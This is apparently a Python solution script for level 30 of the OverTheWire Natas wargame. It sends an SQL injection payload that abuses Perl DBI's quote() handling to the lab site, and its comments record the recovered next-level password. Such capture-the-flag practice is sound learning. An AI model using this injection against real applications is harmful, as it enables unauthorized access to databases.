#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas30"
password = "wie9iexae0Daihohv8vuu3cei9wahf0e"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

# for more details about this perl sql vuln
# look at:
# https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection

injection = ["'' or 1", 4]
post_data = {"username": "natas31", "password": injection}

response = session.post(url, data=post_data, auth=(username, password))
content = response.content

soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas31
# Password: hay7aecuungiuKaezuathuk9biin0pu1

